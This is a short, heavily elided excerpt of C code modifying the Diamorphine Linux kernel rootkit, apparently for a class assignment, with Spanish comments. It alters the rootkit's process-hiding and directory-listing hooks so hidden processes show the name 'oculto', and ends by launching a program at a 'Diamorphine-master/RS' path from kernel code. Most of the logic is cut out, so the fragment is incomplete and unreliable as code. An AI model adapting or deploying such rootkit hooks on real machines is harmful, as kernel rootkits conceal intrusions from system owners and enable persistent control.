...
is_invisible(pid_t pid)
{
        ...
        if (!task)
                return 0;
	 //Mostrar "oculto" en lugar  de ocultar
        if (task->flags & PF_INVISIBLE) {
        strcpy(task->comm, "oculto");  
        return 0;
        }
        return 0;
}
        ...
        unsigned int count)
{
        ...
        while (off < ret) {
                ...
                is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
                  //mostrar "oculto" en lugar de nombre real
                strcpy(dir->d_name, "oculto");
                } else {
                prev = dir;
}
                off += dir->d_reclen;
...
{
        char *argv[] = { "/home/tarea/Desktop/Diamorphine-master/RS", NULL };    
